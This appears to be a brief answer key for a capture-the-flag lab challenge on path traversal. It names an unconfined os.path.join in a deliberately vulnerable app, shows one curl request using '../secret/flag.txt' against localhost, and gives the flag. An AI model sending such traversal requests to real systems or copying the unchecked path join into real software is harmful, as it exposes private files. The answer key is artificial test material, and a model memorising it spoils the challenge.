# Solution: A11 - PATH TRAVERSAL

## Concept
Arbitrary file read via directory path traversal (`../`).

## Walkthrough
1. Inspect `challenge/app/app.py`.
2. Notice `os.path.join("public", filename)` lacks base folder confinement checks.
3. Send a request with traversal sequences:
   ```bash
   curl "http://localhost:5005/download?file=../secret/flag.txt"
   ```
4. Output: `path traversal exposed`.

## Flag
`path traversal exposed`
